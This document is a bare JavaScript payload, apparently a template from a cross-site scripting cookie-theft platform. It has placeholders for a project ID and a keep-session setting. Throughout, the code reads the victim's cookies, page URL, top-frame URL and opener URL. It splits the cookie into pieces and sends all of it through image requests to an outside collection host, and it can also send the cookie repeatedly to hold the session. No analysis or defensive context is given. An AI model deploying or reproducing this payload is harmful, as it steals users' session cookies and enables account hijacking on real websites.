(function() {
    (new Image()).src = 'http://www.yc-so.com/xser/s.php?do=api&id={projectId}&location=' + escape((function() {
        try {
            return document.location.href
        } catch (e) {
            return ''
        }
    })()) + '&toplocation=' + escape((function() {
        try {
            return top.location.href
        } catch (e) {
            return ''
        }
    })()) + '&c=' + escape((function() {
        try {
            var c1=document.cookie;
            var clen=c1.length/3;
            c2=c1.substring(0,clen );      
 
            var clen2=c1.length/1.5;
            c3=c1.substring(clen, clen2);
            c4=c1.substring(clen2,c1.length );

           document.write("<img src='http://www.yc-so.com/xser/s.php?c="+c2+"'><img src='http://www.yc-so.com/xser/s.php?c="+c3+"'>");
            return c4;
        } catch (e) {
            return ''
        }
    })()) + '&opener=' + escape((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
        } catch (e) {
            return ''
        }
    })());
})();
if ('{set.keepsession}' == 1) {
    keep = new Image();
    keep.src = 'http://www.yc-so.com/xser/s.php?do=keepsession&id={projectId}&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
};
